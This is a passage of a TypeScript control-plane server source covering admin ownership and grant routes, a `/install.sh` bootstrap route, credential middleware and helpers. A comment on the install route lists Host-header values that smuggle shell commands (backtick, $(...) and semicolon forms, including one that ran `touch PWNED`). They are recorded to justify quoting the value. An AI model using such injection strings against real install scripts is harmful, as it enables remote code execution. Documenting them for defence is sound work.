    if (!machine) return jsonError(c, 404, "machine_not_found", "no such machine");
    // A revoked machine is refused rather than adopted: revoking is what *frees*
    // the label and the quota slot, so handing one back would spend both on a
    // machine nothing can reach.
    if (machine["revoked_at"] !== null) {
      return jsonError(c, 403, "machine_revoked", "this machine has been revoked");
    }
    if (!db.prepare("SELECT id FROM users WHERE id = ?").get(userId)) {
      return jsonError(c, 404, "user_not_found", "no such user");
    }

    /*
     * The same cap `createOwnedMachine` enforces, counted here because that
     * function is not the one doing the insert. Rows for *other* machines only,
     * so re-labelling a machine this user already owns is never refused as their
     * fifty-first.
     */
    const owned = Number(
      db
        .prepare("SELECT COUNT(*) AS n FROM machine_owners WHERE user_id = ? AND machine_id != ?")
        .get(userId, machineId)?.["n"] ?? 0,
    );
    // Their configurable limit under the fleet ceiling — the same pair
    // `createOwnedMachine` applies, spelled here because this route does its own
    // INSERT rather than going through it.
    const ceiling = Math.min(effectiveLimit(db, userId).limit, MAX_MACHINES_PER_USER);
    if (owned >= ceiling) {
      return jsonError(
        c,
        409,
        "machine_limit",
        `that user's machine limit is ${ceiling} and they already own ${owned} — raise their limit first`,
      );
    }

    /*
     * Two clash checks, because neither contains the other.
     *
     * `nameVisibleTo` is the wider one and the one that matters to a human: it
     * asks what this user can already *see*, which includes machines somebody
     * shared with them and legacy rows carrying `machines.name`. It only sees
     * machines they hold a grant on, though — and this route can hand somebody a
     * machine they have no grant on yet, so the unique index on
     * `(user_id, label)` is reachable underneath it. Asking directly turns that
     * into a 409 rather than a `UNIQUE constraint failed` 500.
     */
    if (nameVisibleTo(db, userId, label, machineId)) {
      return jsonError(c, 409, "machine_exists", "that user can already see a machine with that name");
    }
    if (
      db
        .prepare("SELECT machine_id FROM machine_owners WHERE user_id = ? AND label = ? AND machine_id != ?")
        .get(userId, label, machineId)
    ) {
      return jsonError(c, 409, "machine_exists", "that user already has a machine with that name");
    }

    const now = Date.now();
    /*
     * **When this user acquired the machine — and re-labelling is not acquiring
     * it.**
     *
     * A transfer gets today's timestamp, and should: the machine becomes the new
     * owner's newest acquisition, so it is the first of theirs to fall over
     * their limit, and preserving the old owner's timestamp would let an adopted
     * machine out-rank ones they created years earlier — a rule nobody could
     * predict from this screen. The refusal above already stops a transfer
     * landing over the limit.
     *
     * But this route is *also* the admin's only way to change an owner-label,
     * which is exactly why the count above excludes `machine_id != ?`. Handing a
     * machine back to the owner it already has is not an acquisition, and
     * re-stamping there would move it silently to the back of its own owner's
     * queue — changing which of their machines the limit switches off, with
     * nothing said and nothing to see. Invisible before `quota.ts` existed;
     * load-bearing now.
     *
     * Read before `releaseOwner`, because that is what destroys it.
     */
    const previous = db.prepare("SELECT user_id, created_at FROM machine_owners WHERE machine_id = ?").get(machineId);
    const acquiredAt =
      previous !== undefined && String(previous["user_id"]) === userId ? Number(previous["created_at"]) : now;
    db.exec("BEGIN");
    try {
      // Replace rather than upsert: `machine_owners` is keyed on the machine, so
      // handing it to somebody else is one row out and one row in.
      releaseOwner(db, machineId);
      db.prepare("INSERT INTO machine_owners (machine_id, user_id, label, created_at) VALUES (?, ?, ?, ?)").run(
        machineId,
        userId,
        label,
        acquiredAt,
      );
      db.prepare(
        "INSERT INTO grants (user_id, machine_id, scopes, created_at) VALUES (?, ?, ?, ?) " +
          "ON CONFLICT(user_id, machine_id) DO UPDATE SET scopes = excluded.scopes",
      ).run(userId, machineId, ALL_SCOPES.join(" "), now);
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      throw error;
    }

    return c.json({ machineId, userId, label, scopes: [...ALL_SCOPES] });
  });

  app.put("/v1/admin/grants", requireAdmin, async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const userId = body["userId"];
    const machineId = body["machineId"];
    if (typeof userId !== "string" || typeof machineId !== "string") {
      return jsonError(c, 400, "bad_request", "userId and machineId are required");
    }
    const scopes = readScopes(body["scopes"]);
    if (scopes === null) {
      return jsonError(c, 400, "bad_request", `scopes must be an array drawn from ${ALL_SCOPES.join(", ")}`);
    }
    if (!db.prepare("SELECT id FROM users WHERE id = ?").get(userId)) {
      return jsonError(c, 404, "user_not_found", "no such user");
    }
    if (!db.prepare("SELECT id FROM machines WHERE id = ?").get(machineId)) {
      return jsonError(c, 404, "machine_not_found", "no such machine");
    }

    db.prepare(
      "INSERT INTO grants (user_id, machine_id, scopes, created_at) VALUES (?, ?, ?, ?) " +
        "ON CONFLICT(user_id, machine_id) DO UPDATE SET scopes = excluded.scopes",
    ).run(userId, machineId, scopes.join(" "), Date.now());

    return c.json({ userId, machineId, scopes });
  });

  app.delete("/v1/admin/grants", requireAdmin, (c) => {
    const userId = c.req.query("userId") ?? "";
    const machineId = c.req.query("machineId") ?? "";
    const changed = db.prepare("DELETE FROM grants WHERE user_id = ? AND machine_id = ?").run(userId, machineId);
    if (changed.changes !== 1) return jsonError(c, 404, "grant_not_found", "no such grant");
    return c.json({ revoked: true, outstandingTokensExpireWithinSeconds: tokenTtlSeconds });
  });

  /*
   * Bounded, because grants are users × machines.
   *
   * The other two admin lists are one row per user and per machine; this one
   * multiplies, so it is the only admin read that grows with the product of the
   * fleet. `limit`/`offset` with a `total`, so `cpctl` can say "showing 500 of
   * 5000" rather than silently printing a truncated table — a list that quietly
   * stops short reads as "that is all of them".
   */
  app.get("/v1/admin/grants", requireAdmin, (c) => {
    const limit = boundedInt(c.req.query("limit"), DEFAULT_GRANT_PAGE, MAX_GRANT_PAGE);
    const offset = boundedInt(c.req.query("offset"), 0, Number.MAX_SAFE_INTEGER);
    const total = Number(db.prepare("SELECT COUNT(*) AS n FROM grants").get()?.["n"] ?? 0);
    const rows = db
      .prepare("SELECT user_id, machine_id, scopes FROM grants ORDER BY created_at ASC, user_id ASC LIMIT ? OFFSET ?")
      .all(limit, offset);
    return c.json({
      grants: rows.map((row) => ({
        userId: String(row["user_id"]),
        machineId: String(row["machine_id"]),
        scopes: parseScopes(String(row["scopes"])),
      })),
      total,
      limit,
      offset,
    });
  });

  /* ---------------------------------------------------------------- *
   * The web client
   *
   * Registered last, after every `/v1` route, so nothing here can shadow the
   * API — an unknown `/v1/...` must stay a JSON 404 and not become an HTML page
   * that a client will try to parse.
   *
   * **These assets are public, and the one line that decides it is
   * `app.use("/v1/*", callerAuth(db))`** — scoped to `/v1`, so nothing registered
   * out here is behind a credential. That is correct rather than overlooked: the
   * bundle holds no secret. It used to say "outside the four `apiKeyAuth` lines
   * above"; all four are gone, replaced by the single positional gate at THE
   * LINE, and a comment naming lines that no longer exist is how somebody comes
   * to look for a mechanism that is not there.
   *
   * The credential story moved too. The app normally holds a **session token**
   * minted by `POST /v1/login` from a name and a password — not an API key typed
   * in by hand, which is what this used to describe. A key is still accepted in
   * its place, and is what `cpctl`, a script, and getting back in after a
   * rollback use. Either way it lives in `localStorage`, is always explicit and
   * never a cookie (`src/cors.ts` answers `*` and never sends
   * `Access-Control-Allow-Credentials`), and is sent only back to this origin —
   * never to a daemon and never to the relay.
   * ---------------------------------------------------------------- */

  /* ----------------------------------------------------------------
   * `GET /install.sh` — the one command a machine is added with.
   *
   * The body is `deploy/bootstrap.sh` with **this instance's own origin**
   * substituted in, so the copy somebody downloads from their own control plane
   * defaults to their own control plane and never to anybody else's. That is
   * the whole reason this is a route and not a file in the bundle: a static file
   * cannot know what host it was asked on.
   *
   * **Public by path rather than by position, and that is worth saying out loud
   * here** — every other public route in this file sits above THE LINE
   * deliberately, and this one looks like a violation of that rule. It is not:
   * `callerAuth` is mounted on `/v1/*`, so nothing outside that prefix has ever
   * reached it. What decides this route's placement is the two handlers *below*
   * it. It must come before `serveStatic`, or a stray `install.sh` in `dist`
   * would answer first with an unsubstituted copy; and before the SPA fallback,
   * which refuses it anyway — `looksLikeAsset` matches a trailing `.sh`, which
   * is exactly what makes `/install.sh` a free path.
   *
   * ⚠ **The substituted value is caller-influenced, and unquoted it is remote
   * code execution in a script people pipe into `sh`.** `publicUrl` is
   * `new URL(c.req.url).origin`, i.e. the `Host` header. Measured 2026-08-08
   * through a real `node:http` server and written up at
   * `packages/web/src/enrollment.ts`: a `Host` of ``a`id`b``, `a$(id)b`, `a'b`
   * and `a;id` all reach `URL.origin` intact, and sourcing
   * ``REEMOAT_CONTROL_PLANE=http://a`touch PWNED`b`` created the file. So it
   * goes through `shellQuote`, which is the third hand-mirrored copy of that
   * function in this repository and is compared to the other two **by
   * behaviour** — `webcheck` reads all three off disk and runs them over a table
   * of hostile URLs.
   *
   * ⚠ **`split`/`join`, never `replace`/`replaceAll`.** The replacement string
   * is derived from the `Host` header and can contain `$&`, `` $` ``, `$'` and
   * `$$`, every one of which expands inside a `String.replace` replacement.
   * `src/changes.ts` records this exact defect being shipped once already, in
   * `rewriteNoIndexHeader`, where a file named `a$&b.txt` spliced an absolute
   * path back into a diff header. `split`/`join` expands nothing — and asserting
   * `length === 2` gets "exactly one placeholder" for free, which is the other
   * thing that has to be true.
   *
   * `text/plain` rather than `application/x-sh` or `text/x-shellscript`: those
   * two make Chrome and Safari download the file instead of showing it, and
   * "read it before you pipe it into a shell" is advice this route has to be
   * able to honour. `nosniff` is already on every response here, so the type
   * cannot be reinterpreted as HTML.
   *
   * `no-store` rather than `no-cache`, because **this body varies by `Host`**. A
   * shared cache keyed on the path alone would hand one instance's address to
   * another instance's users. `Vary` is not the tool — `Host` is part of the
   * HTTP/1.1 cache key by definition — and a 30 KB file fetched once per machine
   * is not worth being clever about.
   * ---------------------------------------------------------------- */
  const bootstrapScript = options.bootstrapScript ?? null;
  if (bootstrapScript !== null) {
    app.get("/install.sh", async (c) => {
      let template: string;
      try {
        // Read per request, and asynchronously. Both halves are lessons this
        // file already learnt one block down: a copy taken once at registration
        // goes stale because `deploy.sh` moves the checkout under a running
        // process, and a *synchronous* read blocks the event loop that carries
        // every relay tunnel.
        template = await readFile(bootstrapScript, "utf8");
      } catch {
        // A missing file is a legal deployment — a trimmed image, or an
        // override pointing at nothing — not a 500. Same answer the SPA
        // fallback gives when there is no `index.html` behind it.
        return jsonError(c, 404, "not_found", "no such endpoint");
      }
      const origin = installOrigin(c, trustedProxyHops);
      const parts = template.split(INSTALL_PLACEHOLDER);
      // An installer with no control plane in it, or one with two places to put
      // it, is worse than no installer: the first refuses at run time with a
      // message about a placeholder and the second is ambiguous. Neither ships.
      if (origin === "" || parts.length !== 2) {
        return jsonError(c, 404, "not_found", "no such endpoint");
      }
      return c.body(parts.join(shellQuote(origin)), 200, {
        "content-type": "text/plain; charset=utf-8",
        "cache-control": "no-store",
      });
    });
  }

  const webRoot = options.webRoot ?? null;
  if (webRoot !== null && existsSync(webRoot)) {
    app.use("*", serveStatic({ root: webRoot, precompressed: true }));

    /*
     * The SPA fallback serves the *same file from disk* that `/` does.
     *
     * It used to hold a `readFileSync` copy taken once at registration, on the
     * reasoning that the bundle is immutable per build and a rebuild restarts the
     * process. The first half is true and the second is not: `pnpm web:build`
     * rewrites `dist/` under a running control plane, and nothing restarts it.
     *
     * What that produced is the worst shape a bug can have — the two ways of
     * getting the same page disagreed. `/` goes through `serveStatic`, which stats
     * and streams from disk, so it returned the *new* HTML with the new hashed
     * chunk names. Every client-side route (`/m/:machine/s/:session`, `/settings`)
     * fell through to here and returned the *old* HTML, naming chunks Vite had
     * already deleted. Measured 2026-08-01 against a running instance: `/` served
     * `index-BnlrEjly.js` while `/m/…/s/…` served `index-0vnvikLW.js`, and that
     * file answered `404`. So the home screen worked and reloading on a session
     * gave a blank white page with an empty `<div id="root">` — no error, nothing
     * to read, on a phone with no console. Restarting the process "fixed" it,
     * which is exactly what makes it a trap rather than a bug somebody finds.
     *
     * One mechanism for both, so they cannot drift apart again. It also costs no
     * synchronous I/O in the handler, which was the real point of caching: this
     * process carries every relay tunnel, and `serveStatic` stats and streams
     * asynchronously.
     *
     * `/v1` and `/health` are excluded explicitly. They reach here only when they
     * name nothing — a typo, or a route from a newer client — and answering that
     * with 200 and a page of HTML would turn "this endpoint does not exist" into
     * a JSON parse error somewhere much further away.
     *
     * So are paths that look like an asset. A stale `index.html` in a phone's
     * cache asks for a hashed chunk that a rebuild has removed; answering that
     * with a page of HTML makes the browser report a MIME type error instead of
     * the 404 that would tell it to reload.
     */
    const serveIndex = serveStatic<AppEnv>({ root: webRoot, path: "index.html" });

    app.get("*", async (c) => {
      const path = c.req.path;
      if (path === "/health" || path === "/v1" || path.startsWith("/v1/")) {
        return jsonError(c, 404, "not_found", "no such endpoint");
      }
      /*
       * The whole `/assets/` namespace, not only the paths that look like files.
       *
       * That directory belongs to the bundle: `serveStatic` has already answered
       * everything really in it, so reaching here under that prefix means the
       * file is gone — and a client-side route never lives there (they are `/`,
       * `/new`, `/new/:machine`, `/m/:machine/s/:session` and `/settings`).
       *
       * `looksLikeAsset` alone let an extensionless `/assets/foo` through to a
       * page of HTML at 200, which the cache middleware above then stamped
       * immutable for a year. Refusing the prefix outright is the honest answer
       * to "that chunk is not here" and removes the case rather than handling it.
       */
      if (path.startsWith("/assets/") || looksLikeAsset(path)) {
        return jsonError(c, 404, "not_found", "no such endpoint");
      }
      // `serveStatic` answers with the file or calls `next` — and its `next` here
      // is a no-op, so "it returned nothing" means there is no `index.html` behind
      // an otherwise present web root. That stays a JSON 404 rather than becoming
      // a confusing blank page, which is what the old `indexHtml === null` arm did.
      const served = await serveIndex(c, async () => {});
      return served ?? jsonError(c, 404, "not_found", "no such endpoint");
    });
  }

  return app;
}

/* ------------------------------------------------------------------ *
 * Helpers
 * ------------------------------------------------------------------ */

/**
 * One shape for a machine, wherever it is returned.
 *
 * `POST`, `PATCH` and `GET /v1/admin/machines` all describe the same entity, and
 * they had three different field sets — `POST` omitted `enrolled`/`revoked`/relay
 * state, `PATCH` omitted `revoked`, `GET` omitted `relayUrl`. Each satisfied its
 * own caller in `cpctl`, so the divergence was invisible until a fourth caller
 * appeared and found a field missing from one route that the other two carried.
 *
 * `baseUrl` used to be in the set and is not any more: there is one route into a
 * machine and it is this service, so an address per machine is not a thing to
 * record. `relayOnline` is therefore reachability outright rather than
 * reachability by one of two paths.
 */
function adminMachineProjection(
  row: Record<string, unknown>,
  relayUrlFor: (machineId: string) => string | null,
  online: (machineId: string) => boolean,
  overLimit: (machineId: string) => boolean,
  ownerFor: (machineId: string) => { userId: string; label: string } | null,
  /**
   * When this machine was last known to be connected, or `null`.
   *
   * Beside `relayOnline` rather than folded into it, because they answer
   * different questions and the second one is the one somebody actually has:
   * `relayOnline` is a boolean about *now*, and until this field there was
   * nothing behind it — "offline for a minute" and "offline since Tuesday" drew
   * identically, so a closed laptop and a VPS that died were the same row.
   *
   * `null` means nothing has ever recorded a tunnel for it: a machine that has
   * never enrolled, and every machine on an instance that predates the table.
   * Deliberately not zero, which a client would have to special-case anyway and
   * would render as 1970.
   */
  lastSeen: (machineId: string) => number | null,
): Record<string, unknown> {
  const id = String(row["id"]);
  return {
    id,
    name: String(row["name"]),
    enrolled: row["enrolled_at"] !== null && row["enrolled_at"] !== undefined,
    revoked: row["revoked_at"] !== null && row["revoked_at"] !== undefined,
    relayUrl: relayUrlFor(id),
    relayOnline: online(id),
    /*
     * Past its owner's machine limit, and who that owner is.
     *
     * `owner: null` is a machine nobody owns — every row registered before
     * `machine_owners` existed, every one created here with no `ownerId`, and
     * every one a deleted user left behind. Those are **unlimited**, because
     * there is no owner to have a limit, and that is a knowing gap rather than
     * an oversight: closing it would take every pre-ownership machine in every
     * existing database off the network. Carried on the row so an admin can
     * *see* the machines nobody's limit counts, and adopt one with
     * `PUT /v1/admin/machines/:id/owner`, which re-imposes the count.
     */
    overLimit: overLimit(id),
    owner: ownerFor(id),
    lastSeenAt: lastSeen(id),
  };
}

/**
 * A request for a file, rather than for a client-side route.
 *
 * `serveStatic` runs first and answers anything that exists, so reaching the SPA
 * fallback with an extension means the file is *gone* — the usual cause being a
 * phone holding a cached `index.html` that references a hashed chunk a rebuild
 * replaced. Serving HTML there produces a MIME type error in the console; a 404
 * tells the browser what actually happened.
 *
 * The last path segment, because a client-side route may well contain a dot
 * (`/sessions/some.host`) while an asset's dot is in its filename.
 */
function looksLikeAsset(path: string): boolean {
  const last = path.slice(path.lastIndexOf("/") + 1);
  return /\.[a-zA-Z0-9]{1,8}$/.test(last);
}

/**
 * Resolves a presented credential — an API key or a session token — to a caller.
 *
 * **Which table to look in is decided by the first three characters, before any
 * query runs.** `rk_` and `rs_` are the two, and the shape is the one
 * `keyPrefix` has always assumed: it slices past exactly three, so every
 * credential in this service is `xxx_` plus 32 bytes of base64url. One indexed
 * probe rather than two, on a path that runs for every authenticated request on
 * the event loop that also carries every tunnel. The prefix is not a secret —
 * it is the token's own first three characters — so branching on it tells an
 * attacker nothing they did not send.
 *
 * A disabled user fails here whichever credential was used, which is what makes
 * that revocation immediate: unlike a machine or grant revocation it is checked
 * on every request rather than only at minting time.
 *
 * **The two "invalid" codes keep their names** even though they now cover both
 * credential kinds. They are the wire contract `cpctl` prints and the daemon's
 * own vocabulary mirrors, and renaming one for accuracy is the trade this
 * codebase refuses elsewhere. What matters is that neither says *which* table the
 * guess landed in, and neither does.
 */
function callerAuth(db: DatabaseSync): MiddlewareHandler<AppEnv> {
  /*
   * Prepared here, in the factory, not inside the handler.
   *
   * This runs on every authenticated request to this service. Inside the returned
   * closure it was one statement compilation per request, synchronously, on the
   * event loop that also carries every tunnel — for a query that never changes.
   * `sessions.ts` caches its own two for the same reason.
   */
  const keyByPrefix = db.prepare(
    "SELECT k.id AS key_id, k.key_hash, k.revoked_at, k.last_used_at, u.id, u.name, u.is_admin, u.disabled_at " +
      "FROM api_keys k JOIN users u ON u.id = k.user_id WHERE k.prefix = ?",
  );
  /*
   * The one write on the API-key path, and the reason it is conditional.
   *
   * `last_used_at` is what lets a row in the keys list say "last used 2 d ago",
   * and `schema.sql` warns at the column what an unconditional write here would
   * cost: this middleware runs on every authenticated request, on the event loop
   * every tunnel shares, so a write per request is a disk write per request. It
   * is written **at most once a minute per key** instead — the same discipline
   * `touchSession` keeps for `last_seen_at`, at a shorter interval because "used
   * today" is the resolution a person revoking a key wants. The `WHERE` repeats
   * the staleness test so two overlapping requests on one key cost one write,
   * and `revoked_at IS NULL` is belt over braces: the refusal above never reaches
   * this statement, and a revoked key's value must stop where the revocation
   * found it regardless.
   */
  const touchKey = db.prepare(
    "UPDATE api_keys SET last_used_at = ? WHERE id = ? AND revoked_at IS NULL AND (last_used_at IS NULL OR last_used_at < ?)",
  );
  const userById = db.prepare("SELECT id, name, is_admin, disabled_at FROM users WHERE id = ?");

  return async (c, next) => {
    const presented = bearerToken(c.req.header("authorization"));
    if (presented === null || presented.length === 0) {
      return jsonError(c, 401, "missing_api_key", "missing API key");
    }

    if (presented.startsWith(SESSION_PREFIX)) {
      const resolved = resolveSession(db, presented);
      if (!resolved.ok) {
        // Three refusals rather than one, and reporting them apart is safe here in
        // a way it is not on the login route: to reach any of these you had to
        // present a real 256-bit token. The client needs the distinction —
        // "expired" means offer the sign-in form, the others mean the stored
        // credential is finished.
        if (resolved.reason === "revoked") {
          return jsonError(c, 401, "session_revoked", "this session has been signed out");
        }
        if (resolved.reason === "expired") {
          return jsonError(c, 401, "session_expired", "this session has expired — sign in again");
        }
        return jsonError(c, 401, "invalid_api_key", "invalid API key");
      }

      const user = userById.get(resolved.session.userId);
      // A session whose user row is gone is not a session. Reported as an invalid
      // credential rather than as a missing user, because the caller is not
      // entitled to learn which.
      if (!user) return jsonError(c, 401, "invalid_api_key", "invalid API key");
      if (user["disabled_at"] !== null) {
        return jsonError(c, 403, "user_disabled", "this user has been disabled");
      }

      touchSession(db, resolved.session.id);
      c.set("caller", {
        userId: String(user["id"]),
        name: String(user["name"]),
        isAdmin: Number(user["is_admin"]) === 1,
        via: "session",
        sessionId: resolved.session.id,
      });
      return next();
    }

    if (!presented.startsWith(API_KEY_PREFIX)) {
      // Neither shape, so there is nothing to look up. Refused without touching
      // the database, and with the same answer a wrong key gets.
      return jsonError(c, 401, "invalid_api_key", "invalid API key");
    }

    const rows = keyByPrefix.all(keyPrefix(presented));

    for (const row of rows) {
      if (!credentialMatches(presented, String(row["key_hash"]))) continue;
      if (row["revoked_at"] !== null) {
        return jsonError(c, 401, "api_key_revoked", "this API key has been revoked");
      }
      if (row["disabled_at"] !== null) {
        return jsonError(c, 403, "user_disabled", "this user has been disabled");
      }
      // Accepted: the only point on this path where the key is known to be live.
      // The staleness test is repeated in JavaScript so the common case — a key
      // used a second ago — costs no statement at all.
      const usedAt = row["last_used_at"] === null ? null : Number(row["last_used_at"]);
      const at = Date.now();
      if (usedAt === null || at - usedAt >= KEY_TOUCH_INTERVAL_MS) {
        touchKey.run(at, String(row["key_id"]), at - KEY_TOUCH_INTERVAL_MS);
      }
      c.set("caller", {
        userId: String(row["id"]),
        name: String(row["name"]),
        isAdmin: Number(row["is_admin"]) === 1,
        via: "api_key",
        sessionId: null,
      });
      return next();
    }
    return jsonError(c, 401, "invalid_api_key", "invalid API key");
  };
}

/**
 * The obligation on an account, or `null`.
 *
 * One indexed probe on a table with approximately zero rows — the same cost
 * `GET /v1/me` already pays to answer `hasPassword`. Prepared once per database
 * in a `WeakMap`, `callerAuth`'s own pattern, because this runs on every
 * authenticated request below THE SECOND LINE.
 */
const obligationStatements = new WeakMap<DatabaseSync, ReturnType<DatabaseSync["prepare"]>>();

function obligationOf(db: DatabaseSync, userId: string): string | null {
  let statement = obligationStatements.get(db);
  if (statement === undefined) {
    statement = db.prepare("SELECT reason FROM password_obligations WHERE user_id = ?");
    obligationStatements.set(db, statement);
  }
  const row = statement.get(userId);
  return row === undefined ? null : String(row["reason"]);
}

/**
 * THE SECOND LINE's middleware. See the comment at its registration.
 *
 * Deliberately does not read `caller.via`: an obligation belongs to the account,
 * and the only credential such an account could hold is one minted before the
 * obligation existed — which is exactly what it exists to invalidate.
 */
function requirePasswordCurrent(db: DatabaseSync): MiddlewareHandler<AppEnv> {
  return async (c, next) => {
    const reason = obligationOf(db, c.get("caller").userId);
    if (reason !== null) {
      return jsonError(
        c,
        403,
        "password_change_required",
        "set a new password before using this account",
        { reason },
      );
    }
    return next();
  };
}

/**
 * `PasswordBusyError` as a response, written once.
 *
 * It was written out four times, three of them byte-identical down to the
 * `Retry-After: 1` — which is the header that makes this a refusal that expires
 * rather than a failure, and therefore the one nobody notices is missing from
 * the fifth copy. The login route's wording differs because what is in flight
 * there is sign-ins rather than a hash, so the message is a parameter and the
 * status, code and header are not.
 */
function passwordBusy(c: Context, message = "too busy to hash a password right now — try again in a moment"): Response {
  c.header("Retry-After", "1");
  return jsonError(c, 503, "overloaded", message);
}

/**
 * A throttle refusal as a response, with the header that makes it actionable.
 *
 * Same argument as `passwordBusy` one function up: three call sites, one of
 * which is new, and the part that must not drift is `Retry-After` agreeing with
 * the `retryAfterSeconds` in the body — a client reading either has to be able
 * to trust it, and `src/http.ts` admits 429 into the envelope precisely so a
 * throttled caller waits instead of retrying into the block.
 */
function tooManyAttempts(c: Context, retryAfterSeconds: number, message = "too many attempts — wait and try again"): Response {
  c.header("Retry-After", String(retryAfterSeconds));
  return jsonError(c, 429, "too_many_attempts", message, { retryAfterSeconds });
}

/**
 * 413 in the envelope every other refusal in this system uses.
 *
 * `bodyLimit`'s default `onError` answers `text/plain` "Payload Too Large", which
 * every client here mis-reads: `src/http.ts` types 413 as part of `ErrorStatus`
 * on purpose, `packages/web`'s `ApiError` parses `error.code`, and `cpctl` prints
 * it — so the one refusal a caller most needs to understand arrived as the one
 * shape none of them can parse. Passed to **every** `bodyLimit` in this file,
 * public and authenticated alike.
 */
function payloadTooLarge(c: Context): Response {
  return jsonError(c, 413, "payload_too_large", "that request body is too large");
}

/**
 * A machine label out of a request body: the trimmed name, or the refusal.
 *
 * One reader for four routes. Each of them used to inline `MACHINE_LABEL.test`
 * with a sentence beside it, and the sentences had **already** come apart into
 * two wordings for one regex — two of them dropped "must start with a letter or
 * digit" — so the same request was refused with two different explanations
 * depending on which route it reached.
 *
 * `labelIsWellFormed` is what actually decides, because it is the one call that
 * cannot test the character rule and forget the reserved shape. `MACHINE_LABEL_RESERVED`
 * is consulted only to pick *which* sentence: a label spelled like a machine id
 * passes `MACHINE_LABEL` by construction, so "letters, digits, and . _ -" would
 * be a refusal that describes a rule the caller did not break.
 */
function readLabel(raw: unknown): { ok: true; label: string } | { ok: false; message: string } {
  if (typeof raw !== "string") return { ok: false, message: MACHINE_LABEL_HELP };
  const label = raw.trim();
  if (MACHINE_LABEL_RESERVED.test(label)) return { ok: false, message: MACHINE_LABEL_RESERVED_HELP };
  if (!labelIsWellFormed(label)) return { ok: false, message: MACHINE_LABEL_HELP };
  return { ok: true, label };
}

/**
 * A user's API keys, as much of one as may ever be shown.
 *
 * **Never `key_hash`, and never the key.** Only the hash was ever stored, so the
 * plaintext is unrecoverable by construction — this projection is what says so
 * out loud beside the two routes that return it. `prefix` is the eight clear
 * characters `keyPrefix` slices out of a key; it is not a secret (it is the
 * token's own middle, and exists to narrow an indexed lookup) and it is the only
 * thing that lets somebody holding two keys tell which row is which.
 *
 * Revoked rows are **listed rather than filtered**, unlike the count on
 * `GET /v1/admin/users`. The count answers "how many credentials still work";
 * this list answers "is the one that leaked dead yet", and a row that vanishes on
 * revocation cannot answer it.
 */
function apiKeyRows(db: DatabaseSync, userId: string): Record<string, unknown>[] {
  return db
    .prepare("SELECT id, prefix, created_at, revoked_at, last_used_at FROM api_keys WHERE user_id = ? ORDER BY created_at ASC")
    .all(userId)
    .map((row) => ({
      id: String(row["id"]),
      prefix: String(row["prefix"]),
      createdAt: Number(row["created_at"]),
      revokedAt: row["revoked_at"] === null ? null : Number(row["revoked_at"]),
      // `null` is "never used since the column existed" — see `schema.sql` —
      // and the list draws it as "never used", which is the honest reading for
      // a key minted after this shipped and the only available one before.
      lastUsedAt: row["last_used_at"] === null ? null : Number(row["last_used_at"]),
    }));
}

/**
 * How stale `api_keys.last_used_at` may get before a request is worth a write.
 *
 * One minute: "used today" is what somebody deciding which key to revoke wants,
 * and a minute of slack keeps a `cpctl` loop or a dashboard poll from turning
 * the authentication path into a write path. `LAST_SEEN_WRITE_INTERVAL_MS` in
 * `sessions.ts` makes the same trade at fifteen minutes for a row nobody reads
 * as often.
 *
 * Exported for `relaycheck`, for the reason that constant is: a guard reachable
 * from nowhere is asserted nowhere.
 */
export const KEY_TOUCH_INTERVAL_MS = 60_000;

/**
 * When this account last chose its own password, or `null`.
 *
 * Read off `users.password_changed_at`, which `migrate()` adds to a database that
 * predates it — so on a row from before the column the answer is `null`, and
 * `GET /v1/me` says so rather than guessing at `user_passwords.updated_at`.
 */
function passwordChangedAt(db: DatabaseSync, userId: string): number | null {
  const row = db.prepare("SELECT password_changed_at FROM users WHERE id = ?").get(userId);
  const value = row?.["password_changed_at"];
  return value === null || value === undefined ? null : Number(value);
}

/**
 * Record that the person chose a password, at the two routes where they do.
 *
 * A function rather than a column in the two upserts, so the list of writers is
 * greppable: `POST /v1/me/password` and `POST /v1/reset`, and nothing else. An
 * admin issuing a temporary password, the bootstrap, and the sign-in rehash all
 * write `user_passwords` and all leave this alone — none of them is the person
 * choosing anything, and the screen draws this as "Changed <age> ago".
 */
function markPasswordChanged(db: DatabaseSync, userId: string, now: number): void {
  db.prepare("UPDATE users SET password_changed_at = ? WHERE id = ?").run(now, userId);
}

/**
 * Retire one API key. `false` when it is unknown, already revoked, or somebody
 * else's — one answer for all three, so probing cannot enumerate what exists.
 *
 * **`user_id` is in the WHERE clause and is not decoration**, the same argument
 * `relabelMachine` makes about its own: with the key id alone this statement
 * revokes any credential in the fleet whenever it is called with the wrong
 * argument, and the route above it would be the only thing that ever stopped it.
 * With the clause it is safe read on its own.
 *
 * `revoked_at IS NULL` is what makes a second call a 404 rather than silently
 * rewriting the timestamp of a revocation that already happened.
 */
function revokeApiKey(db: DatabaseSync, userId: string, keyId: string, now = Date.now()): boolean {
  const changed = db
    .prepare("UPDATE api_keys SET revoked_at = ? WHERE id = ? AND user_id = ? AND revoked_at IS NULL")
    .run(now, keyId, userId);
  return Number(changed.changes) === 1;
}

function parseScopes(value: string): Scope[] {
  return value
    .split(/\s+/)
    .filter((entry) => entry.length > 0)
    .filter((entry): entry is Scope => (ALL_SCOPES as readonly string[]).includes(entry));
}

/** `null` on anything that is not an array of known scopes. */
function readScopes(value: unknown): Scope[] | null {
  if (!Array.isArray(value) || value.length === 0) return null;
  const out: Scope[] = [];
  for (const entry of value) {
    if (typeof entry !== "string") return null;
    if (!(ALL_SCOPES as readonly string[]).includes(entry)) return null;
    if (!out.includes(entry as Scope)) out.push(entry as Scope);
  }
  return out;
}

/**
 * The origin a daemon should be told to dial, taken from the request.
 *
 * There is no configured public URL for the API to read — `REEMOAT_CP_RELAY_URL`
 * is the *relay's* origin, on a different port, and the bind address is
 * `0.0.0.0` under Docker and therefore useless as an address. What there is, is
 * the URL the caller just reached this service on: the web UI is served from this
 * same origin, so whoever is reading an enrollment code on screen got there by a
 * URL that demonstrably works from outside.
 *
 * Best effort and honestly so. Behind a proxy that rewrites Host without setting
 * it correctly this is wrong, and the remedy is that the value lands in a
 * copy-pasteable line a human can edit rather than in a config nobody sees. It is
 * never used for a decision — only printed.
 */
/**
 * The relay, as `connect-src` sources — or nothing.
 *
 * **Two sources for one URL**, and that is the whole reason this is a function.
 * CSP matches a scheme as well as a host, and this client reaches the relay two
 * ways: `fetch` over `https` and a WebSocket over `wss`. Listing the origin alone
 * would pass every route probe and every token mint and then refuse the stream —
 * i.e. it would look like it worked, on a desktop, until somebody opened a
 * session.
 *
 * Empty string on an unparseable or absent URL rather than a throw: this runs at
 * app construction, `main.ts` has already refused to start without a valid
